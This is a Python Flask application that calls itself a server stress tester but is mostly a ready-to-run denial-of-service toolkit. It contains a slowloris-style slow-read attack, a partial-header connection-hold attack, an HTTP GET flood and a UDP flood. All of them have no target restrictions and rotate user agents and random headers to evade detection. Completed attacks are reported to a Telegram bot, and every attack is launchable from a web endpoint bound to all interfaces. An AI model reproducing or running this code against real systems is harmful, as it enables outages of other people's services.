from flask import Flask, render_template, request, jsonify
import asyncio
import socket
import random
import time
import aiohttp
import httpx
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import ssl
from urllib.parse import urlparse
import threading

app = Flask(__name__)

# Initialize the tester
tester = None

class AdvancedStressTester:
    def __init__(self):
        self.results = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'start_time': None,
            'end_time': None,
            'average_response_time': 0,
            'requests_per_second': 0,
            'http_200': 0,
            'http_404': 0,
            'other_status': 0
        }
        self.attack_stats = {
            'total_connections': 0,
            'connections_per_second': 0,
            'bandwidth_used': 0,
            'attack_start': None,
            'attack_end': None,
            'total_packets': 0,
            'total_requests': 0
        }
        self.proxies = []
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        self.attack_running = False
        self.test_running = False
        self.telegram_bot_token = "YOUR_TELEGRAM_BOT_TOKEN"
        self.telegram_chat_id = "YOUR_CHAT_ID"

    def print_banner(self):
        banner = """
        ███████╗████████╗██████╗ ███████╗███████╗███████╗    ████████╗███████╗███████╗████████╗██████╗ 
        ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝    ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔══██╗
        ███████╗   ██║   ██████╔╝█████╗  █████╗  ███████╗       ██║   █████╗  ███████╗   ██║   ██████╔╝
        ╚════██║   ██║   ██╔══██╗██╔══╝  ██╔══╝  ╚════██║       ██║   ██╔══╝  ╚════██║   ██║   ██╔══██╗
        ███████║   ██║   ██║  ██║███████╗██║     ███████║       ██║   ███████╗███████║   ██║   ██║  ██║
        ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝       ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
        
        Advanced Server Stress Tester with Enhanced GSB, SOC, and PKG Attacks
        """
        print(banner)

    async def send_telegram_message(self, message: str):
        if not self.telegram_bot_token or not self.telegram_chat_id:
            return False
        
        url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
        data = {
            "chat_id": self.telegram_chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=data) as response:
                    return response.status == 200
        except Exception as e:
            print(f"Error sending Telegram message: {e}")
            return False

    async def gsb_attack(self, target: str, duration: int, threads: int):
        """Enhanced Get Slow By Attack - Now with proper HTTP requests"""
        self.attack_running = True
        self.attack_stats = {
            'total_connections': 0,
            'connections_per_second': 0,
            'bandwidth_used': 0,
            'attack_start': datetime.now(),
            'attack_end': None,
            'total_packets': 0,
            'total_requests': 0
        }
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
            
        parsed = urlparse(target)
        hostname = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        path = parsed.path or '/'
        
        print(f"\n[GSB+] Starting enhanced attack on {target} for {duration} seconds with {threads} threads")
        print("[GSB+] Using proper HTTP requests with slow reading and connection hold")

        async def slow_request():
            try:
                
                ssl_context = None
                if parsed.scheme == 'https':
                    ssl_context = ssl._create_unverified_context()
                
                
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
                
                
                for _ in range(random.randint(3, 10)):
                    headers[f'X-Random-{random.randint(1000,9999)}'] = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=random.randint(5, 20)))
                
                
                timeout = aiohttp.ClientTimeout(total=30, sock_read=30)
                connector = aiohttp.TCPConnector(
                    force_close=False,
                    enable_cleanup_closed=True,
                    ssl=ssl_context,
                    limit=0
                )
                
                async with aiohttp.ClientSession(
                    connector=connector,
                    timeout=timeout,
                    headers=headers
                ) as session:
                    self.attack_stats['total_connections'] += 1
                    
                    
                    async with session.get(target) as response:
                        self.attack_stats['total_requests'] += 1
                        
                        
                        while True:
                            chunk = await response.content.read(random.randint(1, 1024))
                            if not chunk:
                                break
                            
                            
                            await asyncio.sleep(random.uniform(0.5, 5))
                            self.attack_stats['bandwidth_used'] += len(chunk)
                            self.attack_stats['total_packets'] += 1
                            
                            
                            if random.random() < 0.1:
                                break
            except Exception as e:
                pass

        
        tasks = []
        for _ in range(threads):
            if not self.attack_running:
                break
            task = asyncio.create_task(slow_request())
            tasks.append(task)
            await asyncio.sleep(0.1)  

        
        start_time = time.time()
        last_update = start_time
        
        while self.attack_running and (time.time() - start_time) < duration:
            await asyncio.sleep(1)
            
            now = time.time()
            elapsed = now - last_update
            
            if elapsed >= 1:
                self.attack_stats['connections_per_second'] = self.attack_stats['total_connections'] / elapsed
                last_update = now
                self.print_attack_stats()

        
        self.attack_running = False
        self.attack_stats['attack_end'] = datetime.now()
        
        
        for task in tasks:
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass

        print("\n[GSB+] Attack completed successfully")
        self.print_attack_stats(final=True)
        
        
        message = f"""
<b>GSB+ Attack Completed Successfully</b>
🎯 Target: <code>{target}</code>
⏱ Duration: {duration} seconds
🧵 Threads: {threads}
📦 Total Connections: {self.attack_stats['total_connections']}
📡 Total Requests: {self.attack_stats['total_requests']}
🚀 Connections/s: {self.attack_stats['connections_per_second']:.2f}
📊 Bandwidth Used: {self.attack_stats['bandwidth_used'] / (1024*1024):.2f} MB
📦 Total Packets: {self.attack_stats['total_packets']}
        """
        await self.send_telegram_message(message)

    async def soc_attack(self, target: str, port: int, duration: int, threads: int):
        """Socket Open Connection Attack - Now with HTTP protocol"""
        self.attack_running = True
        self.attack_stats = {
            'total_connections': 0,
            'connections_per_second': 0,
            'bandwidth_used': 0,
            'attack_start': datetime.now(),
            'attack_end': None,
            'total_packets': 0,
            'total_requests': 0
        }
        
        print(f"\n[SOC+] Starting enhanced attack on {target}:{port} for {duration} seconds with {threads} threads")
        print("[SOC+] Using HTTP protocol with partial requests and connection hold")

        async def open_http_connection():
            try:
                
                ip = await asyncio.get_event_loop().getaddrinfo(target, port, proto=socket.IPPROTO_TCP)
                ip = ip[0][4][0]
                
                
                reader, writer = await asyncio.open_connection(ip, port)
                self.attack_stats['total_connections'] += 1
                
                
                request = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                    f"Connection: keep-alive\r\n"
                )
                
                
                writer.write(request.encode())
                await writer.drain()
                self.attack_stats['bandwidth_used'] += len(request)
                self.attack_stats['total_packets'] += 1
                
                
                start_time = time.time()
                while self.attack_running and (time.time() - start_time) < duration:
                    
                    await asyncio.sleep(random.uniform(0.5, 3))
                    
                    
                    if random.random() < 0.3:
                        header = f"X-{random.randint(1000,9999)}: {''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=random.randint(5, 50)))}\r\n"
                        writer.write(header.encode())
                        await writer.drain()
                        self.attack_stats['bandwidth_used'] += len(header)
                        self.attack_stats['total_packets'] += 1
                
                
                writer.close()
                await writer.wait_closed()
                
            except Exception as e:
                pass

        
        tasks = []
        for _ in range(threads):
            if not self.attack_running:
                break
            task = asyncio.create_task(open_http_connection())
            tasks.append(task)
            await asyncio.sleep(0.1)  

        
        start_time = time.time()
        last_update = start_time
        
        while self.attack_running and (time.time() - start_time) < duration:
            await asyncio.sleep(1)
            
            now = time.time()
            elapsed = now - last_update
            
            if elapsed >= 1:
                self.attack_stats['connections_per_second'] = self.attack_stats['total_connections'] / elapsed
                last_update = now
                self.print_attack_stats()

        
        self.attack_running = False
        self.attack_stats['attack_end'] = datetime.now()
        
        
        for task in tasks:
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass

        print("\n[SOC+] Attack completed successfully")
        self.print_attack_stats(final=True)
        
        
        message = f"""
<b>SOC+ Attack Completed Successfully</b>
🎯 Target: <code>{target}:{port}</code>
⏱ Duration: {duration} seconds
🧵 Threads: {threads}
📦 Total Connections: {self.attack_stats['total_connections']}
🚀 Connections/s: {self.attack_stats['connections_per_second']:.2f}
📊 Bandwidth Used: {self.attack_stats['bandwidth_used'] / (1024*1024):.2f} MB
📦 Total Packets: {self.attack_stats['total_packets']}
        """
        await self.send_telegram_message(message)

    async def pkg_attack(self, target: str, duration: int, threads: int, packet_size: int = 1024):
        """Enhanced PKG Attack - Now with proper HTTP GET requests"""
        self.attack_running = True
        self.attack_stats = {
            'total_connections': 0,
            'connections_per_second': 0,
            'bandwidth_used': 0,
            'attack_start': datetime.now(),
            'attack_end': None,
            'total_packets': 0,
            'total_requests': 0
        }
        
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
            
        parsed = urlparse(target)
        hostname = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        path = parsed.path or '/'
        
        print(f"\n[PKG+] Starting enhanced attack on {target} for {duration} seconds")
        print(f"[PKG+] Sending massive HTTP GET requests with {threads} threads")

        async def send_http_flood():
            try:
                
                ssl_context = None
                if parsed.scheme == 'https':
                    ssl_context = ssl._create_unverified_context()
                
                
                reader, writer = await asyncio.open_connection(hostname, port, ssl=ssl_context)
                self.attack_stats['total_connections'] += 1
                
                
                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {hostname}\r\n"
                    f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Content-Length: 0\r\n\r\n"
                )
                
                
                start_time = time.time()
                while self.attack_running and (time.time() - start_time) < duration:
                    writer.write(request.encode())
                    await writer.drain()
                    self.attack_stats['total_requests'] += 1
                    self.attack_stats['bandwidth_used'] += len(request)
                    self.attack_stats['total_packets'] += 1
                    
                    
                    await asyncio.sleep(0.01)
                
                
                writer.close()
                await writer.wait_closed()
                
            except Exception as e:
                pass

        
        tasks = []
        for _ in range(threads):
            if not self.attack_running:
                break
            task = asyncio.create_task(send_http_flood())
            tasks.append(task)
            await asyncio.sleep(0.05)  
        start_time = time.time()
        last_update = start_time
        
        while self.attack_running and (time.time() - start_time) < duration:
            await asyncio.sleep(1)
            
            now = time.time()
            elapsed = now - last_update
            
            if elapsed >= 1:
                self.attack_stats['connections_per_second'] = self.attack_stats['total_requests'] / elapsed
                last_update = now
                self.print_attack_stats()

        
        self.attack_running = False
        self.attack_stats['attack_end'] = datetime.now()
        
        
        for task in tasks:
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass

        print("\n[PKG+] Attack completed successfully")
        self.print_attack_stats(final=True)
        
        
        message = f"""
<b>PKG+ Attack Completed Successfully</b>
🎯 Target: <code>{target}</code>
⏱ Duration: {duration} seconds
🧵 Threads: {threads}
📦 Total Requests: {self.attack_stats['total_requests']}
🚀 Requests/s: {self.attack_stats['connections_per_second']:.2f}
📊 Bandwidth Used: {self.attack_stats['bandwidth_used'] / (1024*1024):.2f} MB
📦 Total Packets: {self.attack_stats['total_packets']}
        """
        await self.send_telegram_message(message)

    def socket_flood(self, target: str, port: int, packets: int, packet_size: int = 1024):
        """UDP Flood Attack - Improved Version"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            
            bytes_to_send = random._urandom(packet_size)
            
            sent_packets = 0
            start_time = time.time()
            
            for _ in range(packets):
                if not self.attack_running:
                    break
                
                
                actual_port = port if random.random() > 0.3 else random.randint(port-10, port+10)
                
                sock.sendto(bytes_to_send, (target, actual_port))
                self.attack_stats['total_packets'] += 1
                self.attack_stats['bandwidth_used'] += packet_size
                sent_packets += 1
                
                
                if sent_packets % 100 == 0:
                    time.sleep(0.01)
            
            sock.close()
            return True
        except Exception as e:
            print(f"Socket flood error: {e}")
            return False

    async def run_load_test(self, url: str, requests: int, concurrency: int, method: str = 'GET', 
                          data: dict = None, headers: dict = None, use_aiohttp: bool = True, 
                          use_proxy: bool = False):
        self.test_running = True
        self.results = {
            'total_requests': requests,
            'successful': 0,
            'failed': 0,
            'start_time': datetime.now(),
            'end_time': None,
            'average_response_time': 0,
            'requests_per_second': 0,
            'response_times': [],
            'http_200': 0,
            'http_404': 0,
            'other_status': 0
        }
        
        print(f"\nStarting load test on {url}")
        print(f"Total Requests: {requests}")
        print(f"Concurrent Connections: {concurrency}")
        print(f"HTTP Method: {method}")
        
        semaphore = asyncio.Semaphore(concurrency)
        
        async def make_request(request_num: int):
            async with semaphore:
                if not self.test_running:
                    return
                
                proxy = random.choice(self.proxies) if use_proxy and self.proxies else None
                
                try:
                    if use_aiohttp:
                        timeout = aiohttp.ClientTimeout(total=15)
                        connector = aiohttp.TCPConnector(force_close=True, limit=0)
                        
                        req_headers = headers or {}
                        if 'User-Agent' not in req_headers:
                            req_headers['User-Agent'] = random.choice(self.user_agents)
                        
                        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                            req_method = getattr(session, method.lower())
                            start_time = time.time()
                            
                            async with req_method(
                                url,
                                headers=req_headers,
                                json=data,
                                proxy=proxy
                            ) as response:
                                await response.read()
                                response_time = time.time() - start_time
                                
                                self.results['successful'] += 1
                                self.results['response_times'].append(response_time)
                                
                                if response.status == 200:
                                    self.results['http_200'] += 1
                                elif response.status == 404:
                                    self.results['http_404'] += 1
                                else:
                                    self.results['other_status'] += 1
                    else:
                        req_headers = headers or {}
                        if 'User-Agent' not in req_headers:
                            req_headers['User-Agent'] = random.choice(self.user_agents)
                        
                        async with httpx.AsyncClient(timeout=15.0, proxies=proxy) as client:
                            req_method = getattr(client, method.lower())
                            start_time = time.time()
                            
                            response = await req_method(
                                url,
                                headers=req_headers,
                                json=data
                            )
                            
                            response_time = time.time() - start_time
                            self.results['successful'] += 1
                            self.results['response_times'].append(response_time)
                            
                            if response.status_code == 200:
                                self.results['http_200'] += 1
                            elif response.status_code == 404:
                                self.results['http_404'] += 1
                            else:
                                self.results['other_status'] += 1
                except Exception as e:
                    self.results['failed'] += 1
                
                completed = self.results['successful'] + self.results['failed']
                if completed % max(1, requests // 10) == 0 or completed == requests:
                    progress = (completed / requests) * 100
                    print(f"Progress: {progress:.1f}% | Successful: {self.results['successful']} | Failed: {self.results['failed']}")
        
        tasks = []
        for i in range(requests):
            if not self.test_running:
                break
            tasks.append(asyncio.create_task(make_request(i)))
            await asyncio.sleep(0.01)  
        
        
        await asyncio.gather(*tasks)
        
        self.test_running = False
        self.results['end_time'] = datetime.now()
        
        total_time = (self.results['end_time'] - self.results['start_time']).total_seconds()
        self.results['requests_per_second'] = requests / total_time if total_time > 0 else 0
        
        if self.results['response_times']:
            self.results['average_response_time'] = sum(self.results['response_times']) / len(self.results['response_times'])
        
        print("\nLoad test completed")
        self.print_test_results()
        
        message = f"""
<b>Load Test Completed</b>
🌐 URL: <code>{url}</code>
🔢 Requests: {requests}
🧵 Concurrency: {concurrency}
✅ Successful: {self.results['successful']}
❌ Failed: {self.results['failed']}
📊 Success Rate: {(self.results['successful'] / self.results['total_requests'] * 100):.2f}%
⏱ Avg Response Time: {self.results['average_response_time']:.4f}s
🚀 Requests/s: {self.results['requests_per_second']:.2f}

<b>HTTP Status Codes:</b>
🟢 HTTP 200: {self.results['http_200']}
🔴 HTTP 404: {self.results['http_404']}
🟡 Other: {self.results['other_status']}
        """
        await self.send_telegram_message(message)

    def print_test_results(self):
        print("\n=== Test Results ===")
        print(f"Total Requests: {self.results['total_requests']}")
        print(f"Successful: {self.results['successful']}")
        print(f"Failed: {self.results['failed']}")
        print(f"Success Rate: {(self.results['successful'] / self.results['total_requests'] * 100):.2f}%")
        print(f"Average Response Time: {self.results['average_response_time']:.4f} seconds")
        print(f"Requests Per Second: {self.results['requests_per_second']:.2f}")
        print(f"Start Time: {self.results['start_time']}")
        print(f"End Time: {self.results['end_time']}")
        print(f"Duration: {(self.results['end_time'] - self.results['start_time']).total_seconds():.2f} seconds")
        print("\nHTTP Status Codes:")
        print(f"HTTP 200: {self.results['http_200']}")
        print(f"HTTP 404: {self.results['http_404']}")
        print(f"Other: {self.results['other_status']}")

    def print_attack_stats(self, final: bool = False):
        if final:
            print("\n=== Final Attack Stats ===")
        else:
            print("\n=== Current Attack Stats ===")
        
        duration = (datetime.now() - self.attack_stats['attack_start']).total_seconds() if self.attack_stats['attack_start'] else 0
        bandwidth_mb = self.attack_stats['bandwidth_used'] / (1024 * 1024)
        
        print(f"Total Connections: {self.attack_stats['total_connections']}")
        print(f"Total Requests: {self.attack_stats.get('total_requests', 0)}")
        print(f"Connections Per Second: {self.attack_stats['connections_per_second']:.2f}")
        print(f"Bandwidth Used: {bandwidth_mb:.2f} MB")
        print(f"Attack Duration: {duration:.2f} seconds")
        print(f"Total Packets: {self.attack_stats.get('total_packets', 0)}")
        
        if self.attack_stats['attack_start']:
            print(f"Attack Start: {self.attack_stats['attack_start']}")
        
        if final and self.attack_stats['attack_end']:
            print(f"Attack End: {self.attack_stats['attack_end']}")

    def load_proxies(self, file_path: str):
        try:
            with open(file_path, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            print(f"Loaded {len(self.proxies)} proxies")
        except Exception as e:
            print(f"Error loading proxies: {e}")

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/load_test', methods=['POST'])
def load_test():
    data = request.json
    url = data['url']
    requests = int(data['requests'])
    concurrency = int(data['concurrency'])
    method = data.get('method', 'GET')
    use_proxy = data.get('use_proxy', False)
    proxy_file = data.get('proxy_file', None)
    
    if use_proxy and proxy_file:
        tester.load_proxies(proxy_file)
    
    def run_test():
        run_async(tester.run_load_test(
            url=url,
            requests=requests,
            concurrency=concurrency,
            method=method,
            use_proxy=use_proxy
        ))
    
    thread = threading.Thread(target=run_test)
    thread.start()
    
    return jsonify({'status': 'started'})

@app.route('/gsb_attack', methods=['POST'])
def gsb_attack():
    data = request.json
    target = data['target']
    duration = int(data['duration'])
    threads = int(data['threads'])
    
    def run_attack():
        run_async(tester.gsb_attack(
            target=target,
            duration=duration,
            threads=threads
        ))
    
    thread = threading.Thread(target=run_attack)
    thread.start()
    
    return jsonify({'status': 'started'})

@app.route('/soc_attack', methods=['POST'])
def soc_attack():
    data = request.json
    target = data['target']
    port = int(data['port'])
    duration = int(data['duration'])
    threads = int(data['threads'])
    
    def run_attack():
        run_async(tester.soc_attack(
            target=target,
            port=port,
            duration=duration,
            threads=threads
        ))
    
    thread = threading.Thread(target=run_attack)
    thread.start()
    
    return jsonify({'status': 'started'})

@app.route('/pkg_attack', methods=['POST'])
def pkg_attack():
    data = request.json
    target = data['target']
    duration = int(data['duration'])
    threads = int(data['threads'])
    packet_size = int(data.get('packet_size', 1024))
    
    def run_attack():
        run_async(tester.pkg_attack(
            target=target,
            duration=duration,
            threads=threads,
            packet_size=packet_size
        ))
    
    thread = threading.Thread(target=run_attack)
    thread.start()
    
    return jsonify({'status': 'started'})

@app.route('/socket_flood', methods=['POST'])
def socket_flood():
    data = request.json
    target = data['target']
    port = int(data['port'])
    packets = int(data['packets'])
    packet_size = int(data.get('packet_size', 1024))
    threads = int(data['threads'])
    
    def run_attack():
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            packets_per_thread = packets // threads
            
            for _ in range(threads):
                futures.append(executor.submit(
                    tester.socket_flood,
                    target=target,
                    port=port,
                    packets=packets_per_thread,
                    packet_size=packet_size
                ))
            
            for future in futures:
                future.result()
            
        tester.print_attack_stats(final=True)
    
    thread = threading.Thread(target=run_attack)
    thread.start()
    
    return jsonify({'status': 'started'})

@app.route('/status')
def status():
    return jsonify({
        'test_running': tester.test_running,
        'attack_running': tester.attack_running,
        'results': tester.results,
        'attack_stats': tester.attack_stats
    })

if __name__ == "__main__":
    tester = AdvancedStressTester()
    tester.print_banner()
    app.run(host='0.0.0.0', port=5000, debug=True)